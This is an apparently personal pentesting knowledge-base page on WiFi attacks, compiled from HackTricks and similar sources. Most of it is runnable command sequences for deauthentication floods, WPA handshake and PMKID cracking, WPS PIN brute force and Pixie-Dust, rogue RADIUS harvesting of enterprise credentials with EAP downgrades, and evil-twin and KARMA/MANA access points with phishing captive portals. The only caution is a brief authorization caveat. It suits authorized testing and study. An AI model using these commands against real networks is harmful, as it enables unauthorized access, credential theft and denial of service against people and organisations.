---
title: WiFi Attacks
type: technique
domain: network
tags: [wifi, wireless, wpa, wpa2, eap, evil-twin, pmkid, deauth]
sources: [hacktricks-wifi]
related: ["[[network-service-attacks]]", "[[password-cracking]]", "[[hash-capture-and-cracking]]"]
---

# WiFi Attacks

WiFi pentesting covers passive recon of 802.11 airspace, forcing handshakes, cracking PSKs offline, abusing WPS, harvesting enterprise (802.1X/EAP) credentials, and standing up rogue APs / evil twins to phish or MitM clients. Almost everything needs an adapter in **monitor mode** with **packet injection** support (Atheros AR9271, Realtek RTL8812AU, Ralink, or a NexMon-patched internal Broadcom on Android).

Put the interface into monitor mode and clear conflicting processes first:

```bash
airmon-ng check kill              # kill NetworkManager/wpa_supplicant that fight monitor mode
airmon-ng start wlan0             # creates wlan0mon in monitor mode
# manual equivalent with iw/ip
iw dev wlan0 set type monitor
ip link set wlan0 up
iw dev wlan0 set channel 6
airmon-ng stop wlan0mon           # back to managed mode when done
```

Cracking of every captured hash (handshake, PMKID, netNTLM, MSCHAPv2) is covered in [[password-cracking]] and [[hash-capture-and-cracking]]. Broadcast poisoning on the WLAN L2 (LLMNR/NBT-NS/mDNS/WPAD Responder) is covered in [[network-service-attacks]].

## Reconnaissance

`airodump-ng` scans the air, listing BSSIDs, channels, encryption (OPN/WEP/WPA/WPA2/WPA3), the `MGT` marker for enterprise, associated clients, and PMKID/handshake sightings.

```bash
airodump-ng wlan0mon                        # 2.4 GHz scan
airodump-ng wlan0mon --band a               # 5 GHz
airodump-ng wlan0mon --band abg             # both bands + hop
airodump-ng wlan0mon --wps                  # show WPS-enabled APs
# lock onto one target to capture (channel + BSSID + write)
airodump-ng wlan0mon -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```

Other recon tools:

```bash
wash -i wlan0mon                            # enumerate WPS APs, lock state, PIN version
kismet -c wlan0mon                          # long-run GUI/web survey, 802.1X/EAP views
iw dev wlan0 scan | grep -E "SSID|WPA|WPS|Authentication"
```

An `MGT` value in the ENC column means WPA-Enterprise: crack path is credentials, not a PSK. `WPA3`/`SAE` and OWE ("open" but per-station encrypted) enforce 802.11w PMF, which blocks spoofed deauth; OWE still does not authenticate joiners, so verify client isolation rather than trusting the label.

## Deauthentication and DoS

Deauth/disassoc are forged unencrypted 802.11 management frames that kick a client off its AP, either to force a handshake or to jam. **RoE caveat:** deauth is a denial-of-service; only run it against in-scope APs/clients with explicit authorization. PMF/802.11w (WPA3, OWE) makes spoofed deauth ineffective.

```bash
# aireplay-ng deauth: -0 <count> (0 = continuous), -a AP, -c client (omit for broadcast)
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 -c 00:0F:B5:34:30:30 wlan0mon
aireplay-ng -0 5 -a 64:20:9F:15:4F:D7 wlan0mon            # broadcast, 5 bursts
# mdk4 disassociation flood (mode d)
mdk4 wlan0mon d -c 6 -B EF:60:69:D7:69:2F
```

`mdk4` also offers beacon flooding (`b`, spawns fake APs, can crash scanners), auth-DoS (`a`), TKIP Michael shutdown (`m`, one-minute freeze on TKIP APs), EAPOL start/logoff flood (`e`), and WIDS confusion (`w`). `bettercap`'s `wifi.deauth <BSSID>` is a convenient one-liner that also reveals hidden SSIDs by forcing probes.

## WPA/WPA2 PSK - Handshake capture and crack

Classic path: sit on the target channel, deauth a connected client, capture the 4-way handshake, crack offline.

```bash
# 1. capture on the target channel/BSSID
airodump-ng wlan0mon -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk
# 2. in a second shell, deauth to force reassociation -> handshake
aireplay-ng -0 3 -a 64:20:9F:15:4F:D7 -c <clientMAC> wlan0mon
# 3. confirm the handshake landed
aircrack-ng /tmp/psk-01.cap                 # look for "WPA handshake: <BSSID>"
tshark -r /tmp/psk-01.cap -n -Y eapol       # should show all 4 EAPOL messages
```

Crack. Modern hashcat uses **mode 22000** (WPA-PBKDF2/EAPOL, the unified format). The old **2500 (hccapx) and 16800 (PMKID) modes are deprecated**, use 22000 for both handshake and PMKID.

```bash
# convert to the 22000 hashline
hcxpcapngtool -o hash.22000 /tmp/psk-01.cap
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
# aircrack-ng can also crack straight from the cap
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk-01.cap
```

## WPA/WPA2 PSK - PMKID clientless attack

Disclosed by hashcat in 2018: many routers put a `PMKID` in the first EAPOL frame of the RSN association, so a single packet from the AP is enough. **No connected client needed.** `PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)`, and the PMK is the same one a full handshake would derive, so the passphrase cracks identically.

```bash
airmon-ng check kill; airmon-ng start wlan0
# hcxdumptool grabs PMKIDs (and handshakes) passively
hcxdumptool -i wlan0mon -o /tmp/attack.pcapng --enable_status=1
# or with eaphammer against a known BSSID
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
# convert and crack (mode 22000)
hcxpcapngtool -o hash.22000 /tmp/attack.pcapng
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

A valid PMKID hashline has 4 parts; a 3-part line means the capture was invalid. `wifite` automates capture-or-PMKID-then-crack end to end.

## WPS attacks

WPS uses an 8-digit PIN validated in two halves (last digit is a checksum), so the search space collapses to about 11,000 tries, and offline flaws make it worse.

```bash
# online PIN brute force
reaver -i wlan0mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -vv
bully  wlan0mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
# Pixie-Dust: offline PIN recovery from weak nonces (E-S1/E-S2), often seconds
reaver -i wlan0mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan0mon -b 00:C0:CA:78:B1:37 -d -v 3
# Null PIN (only reaver tests it)
reaver -i wlan0mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -p '' -vv
# OneShot-C: Pixie-Dust without monitor mode
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```

Recovering the PIN yields the WPA/WPA2 PSK directly, giving persistent access. `wash` (above) tells you which APs are WPS-enabled and unlocked. Databases (ComputePIN, EasyBox, Arcadyan) map MAC OUIs to likely PINs; `airgeddon` and `wifite` wrap all of this.

## WPA-Enterprise (EAP) attacks

Enterprise (802.1X, `MGT`) authenticates users to a RADIUS server over an EAP method (PEAP-MSCHAPv2, EAP-TTLS, EAP-GTC, EAP-TLS, ...). The attack is a **rogue AP + rogue RADIUS** that clones the corporate SSID and captures the inner authentication.

**Username capture (no auth needed):** the outer EAP-Response/Identity is sent in cleartext before TLS. Capture with airodump + wireshark/tshark and read the identity.

```bash
tshark -i wlan0mon -Y 'eap.code == 2 && eap.type == 1' \
  -T fields -e frame.time -e wlan.sa -e eap.identity
```

Well-configured clients send `anonymous`/`anonymous@realm` as the outer identity; leaked mail-style names mean the privacy knob was never enforced and feed spraying/phishing. SIM-based EAP-SIM/EAP-AKA without protected identities leaks the raw IMSI the same way.

**Credential capture (rogue RADIUS):** if clients do not strictly validate the RADIUS server cert, a rogue AP with a self-signed cert harvests **netNTLMv2** (PEAP-MSCHAPv2) or cleartext (GTC).

```bash
# eaphammer: generate cert, then run the rogue enterprise AP
./eaphammer --cert-wizard
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
# hostapd-wpe (packaged on Kali) is the other standard rogue RADIUS
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

**EAP method downgrade:** eaphammer offers GTC first (plaintext passwords) then weaker methods. `--negotiate gtc-downgrade` forces the efficient GTC downgrade; `--negotiate weakest` offers weakest-first. Matching the org's real method order makes the rogue harder to detect. Airgeddon can downgrade to EAP-MD5 and capture user + MD5 for offline cracking.

Crack the captured material (see [[hash-capture-and-cracking]], [[password-cracking]]):

```bash
# hostapd-wpe prints an asleap-style challenge/response for MSCHAPv2
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
hashcat -m 5500 netntlm.txt /usr/share/wordlists/rockyou.txt   # netNTLMv1 / MSCHAPv2
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt # netNTLMv2 (PEAP)
```

**Password spray** against enterprise EAP with a userlist (EAP-TLS is immune, it needs a client cert):

```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
./eaphammer --eap-spray --interface-pool wlan0 wlan1 --essid example-wifi --password bananas --user-list users.txt
```

**Relay instead of crack:** for machine accounts with uncrackable random passwords, run `hostapd-mana` as the evil twin and forward the MSCHAPv2 exchange to `wpa_sycophant`, which authenticates to the real AP in real time, granting Wi-Fi access without recovering the password. PMF blocks deauth coercion, so wait for voluntary associations.

### Evil Twin EAP-TLS

EAP-TLS is the "secure" enterprise choice but breaks in two practical ways:

- **Identity leak:** the outer identity is still cleartext before TLS. TLS 1.3 encrypts client certs and metadata, so a passive evil twin cannot read the identity when 1.3 is actually negotiated. Many stacks allow TLS 1.2 fallback; per RFC 9190 a rogue AP offering only TLS 1.2 static-RSA suites forces a downgrade that re-exposes the identity. Build hostapd-wpe with TLS 1.3 disabled and static-RSA ciphers to steer the downgrade:

```ini
# hostapd-wpe.conf (TLS 1.2 static-RSA downgrade rogue; needs OpenSSL 1.1.1)
ssl_ctx_flags=0
openssl_ciphers=RSA+AES:@SECLEVEL=0
disable_tlsv1_3=1
```

- **Broken server validation turns mTLS into one-way TLS:** if the supplicant does not validate the RADIUS server cert (or lets the user click through an untrusted cert), a rogue AP with any cert onboards victims. A patched hostapd/hostapd-wpe that skips client-cert validation (`SSL_set_verify(..., 0)`) is enough; `force_authorized=1` completes the 4-way handshake even when client auth fails, giving DHCP/DNS-level access to phish. On Windows, triage the WLAN profile for the danger signals:

```powershell
netsh wlan export profile name="CorpWiFi" folder=.
Select-String -Path .\Wi-Fi-*.xml -Pattern 'ServerNames|TrustedRootCAHash|DisablePrompt'
# red flags: empty ServerNames, extra trusted roots, DisablePrompt absent/false, wildcard names
```

Once you can steal or mint a trusted Server-Authentication cert from the org's PKI, the rogue becomes promptless; this overlaps with AD Certificate Services abuse.

## Rogue AP / Evil Twin

An evil twin exploits that clients pick APs by ESSID and the AP never authenticates to the client. Present the same ESSID with a stronger signal (optionally deauth the real AP), and clients roam to you.

```bash
# bare open evil twin (no upstream routing)
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
# eaphammer open evil twin with captive portal (interface NOT in monitor mode)
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
# WPA/WPA2 evil twin (needs the real PSK to complete the 4-way handshake)
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```

To give the rogue AP internet + captive portal, stand up `hostapd` + `dnsmasq` (DHCP/DNS) and NAT out through a wired interface:

```bash
# hostapd.conf: interface=wlan0, ssid=..., channel=11, wpa=2, wpa_passphrase=..., wpa_key_mgmt=WPA-PSK
hostapd ./hostapd.conf
dnsmasq -C dnsmasq.conf -d          # dhcp-range + dhcp-option gateway/DNS
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```

`wifiphisher` automates evil twin + KARMA + known-beacon with phishing captive-portal templates to harvest the real PSK or social creds.

**KARMA / MANA / Known-Beacon** abuse the client's Preferred Network List (PNL) and probe requests:

- **KARMA:** the rogue answers every probe request, claiming to be whatever network the client asks for.
- **MANA:** records directed + broadcast probes per client and replays their PNL entries back, defeating clients that ignore blind KARMA responses.
- **Loud MANA:** broadcasts responses for the union of all observed PNLs when directed probes are scarce.
- **Known Beacon:** cycles ESSIDs from a wordlist to hit an entry in the victim's PNL.

```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal]
./eaphammer -i wlan0 --mana --known-beacons --known-ssids-file wordlist.txt [--loud] [--captive-portal]
```

MFACLs (`--ssid-whitelist`/`--ssid-blacklist`, `--mac-whitelist`/`--mac-blacklist`) scope the rogue to targeted clients/ESSIDs to stay quiet.

## WEP (legacy)

WEP is broken by design: the RC4 seed is IV (24 bits, cleartext, repeats fast) + a static key, and integrity is unkeyed CRC32, so IV reuse plus FMS/PTW statistical attacks recover the key from tens of thousands of ARP frames. Deterministic break:

```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_cap wlan0mon   # collect IVs
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan0mon            # speed up IVs, no deauth
aircrack-ng wep_cap-01.cap                                             # PTW recovers key
```

`airgeddon` and `wifite` ship guided all-in-one WEP workflows.

## Nexmon monitor mode + injection on Android

Most Android phones use a Broadcom/Cypress chip with no monitor or injection support. The open-source **NexMon** framework patches the firmware and ships `libnexmon.so` + `nexutil`; `LD_PRELOAD`-ing the library into stock tools turns the internal Wi-Fi into a monitor/injection interface, no USB adapter needed. Requires root (Magisk >= 24) and a patch matching the exact chip + firmware (e.g. BCM4375B1 on a Galaxy S10, firmware 18.38.18).

```bash
# verify what actually loaded first
su; getenforce; nexutil -V
getprop | grep -E 'wlan.driver|wlan.firmware'
# enable monitor + injection (firmware var 0x613 = frame injection)
svc wifi disable && sleep 2 && ifconfig wlan0 up && nexutil -s0x613 -i -v2
nexutil -m2                       # fast passive-monitor sanity toggle
nexutil -k36/80                   # pin chanspec if only one band shows
# run tools against wlan0 (NexMon keeps wlan0, no wlan0mon)
airodump-ng --band abg wlan0
# disable / restore managed mode
nexutil -m0 && svc wifi enable
```

Inside Kali NetHunter/chroot, preload the object so stock tools use NexMon:

```bash
export LD_PRELOAD=/lib/kalilibnexmon.so   # or libfakeioctl.so, try both names
wifite -i wlan0                            # or aircrack-ng, mdk4, hcxdumptool
```

Gotchas: SELinux must be Permissive (or module context fixed) or ioctls are blocked; if `nexutil -V` shows a firmware newer than the patch, monitor mode silently fails (managed mode / zero frames) and you must rebase the patch with BinDiff/IDA. The **Hijacker** app is a discontinued-but-useful GUI wrapper that toggles monitor mode before airodump/wifite.

## Tools

- **aircrack-ng suite:** airmon-ng (monitor mode), airodump-ng (capture), aireplay-ng (deauth/inject/ARP replay), airbase-ng (rogue AP), aircrack-ng (WEP/WPA crack).
- **hcxdumptool / hcxtools:** PMKID + handshake capture; `hcxpcapngtool` converts to hashcat 22000.
- **hashcat:** GPU cracking, mode **22000** for WPA (handshake + PMKID); 5500/5600 for netNTLM; 2500/16800 deprecated.
- **wifite:** automates WEP/WPS/WPA-PSK (PMKID, handshake, pixie-dust) end to end.
- **eaphammer:** rogue RADIUS enterprise attacks, PMKID, evil twin, MANA/known-beacon, EAP downgrade, cert wizard.
- **hostapd-wpe / hostapd-mana:** rogue RADIUS to capture MSCHAPv2/netNTLM; mana pairs with wpa_sycophant for PEAP relay.
- **reaver / bully:** WPS PIN brute force and pixie-dust; OneShot-C for pixie-dust without monitor mode.
- **mdk4:** deauth/disassoc, beacon flood, auth-DoS, TKIP Michael, EAPOL, WIDS confusion.
- **bettercap:** scriptable `wifi.deauth`, recon, evil twin.
- **wifiphisher:** evil twin + KARMA + known-beacon with phishing captive portals.
- **kismet:** long-run wireless survey / IDS, 802.1X-EAP views.
- **airgeddon:** menu-driven wrapper over most of the above (WEP, WPS, handshake, PMKID, evil twin, enterprise).
- **asleap:** crack captured MSCHAPv2 challenge/response.
- **NexMon / nexutil / Hijacker:** monitor + injection on internal Android Broadcom chips.

## Sources

- HackTricks: Pentesting Wifi (README, evil-twin-eap-tls, enable-nexmon-monitor-and-injection-on-android)
- SpecterOps modern wireless attacks series (rogue AP, evil twin, KARMA, MANA, MFACLs)
- hashcat PMKID clientless attack (2018); evilsocket bettercap PMKID writeup
- Synacktiv "Pentesting Wi-Fi in 2025"; SensePost wpa_sycophant PEAP relay; Unit 42 / NDSS AirSnitch client-isolation research
- RFC 9190 (EAP-TLS 1.3), RFC 4186 (EAP-SIM), 3GPP TS 33.402
